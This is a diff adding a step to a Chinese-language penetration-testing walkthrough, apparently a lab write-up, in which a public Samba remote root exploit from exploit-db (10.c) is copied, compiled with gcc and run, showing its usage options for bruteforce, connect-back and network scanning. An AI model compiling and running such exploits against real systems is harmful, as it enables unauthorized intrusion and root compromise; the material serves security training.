@@ -85,6 +85,32 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 ```
 利用远程RCEexploi
 Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                 | multiple/remote/10.c
+```bash
+──(root㉿kali)-[/home/kali/Desktop/exploit]
+└─# cp /usr/share/exploitdb/exploits/multiple/remote/10.c 10.c          
+└─# ls
+10.c  764.c
+└─# gcc 10.c -o fucksamba                               
+└─# chmod +x fucksamba                                      
+└─# ./fucksamba           
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
+Usage: ./fucksamba [-bBcCdfprsStv] [host]
+-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
+-B <step>       bruteforce steps (default = 300)
+-c <ip address> connectback ip address
+-C <max childs> max childs for scan/bruteforce mode (default = 40)
+-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
+-f              force
+-p <port>       port to attack (default = 139)
+-r <ret>        return address
+-s              scan mode (random)
+-S <network>    scan mode
+-t <type>       presets (0 for a list)
+-v              verbose mode
+
+```
+
 
 
 
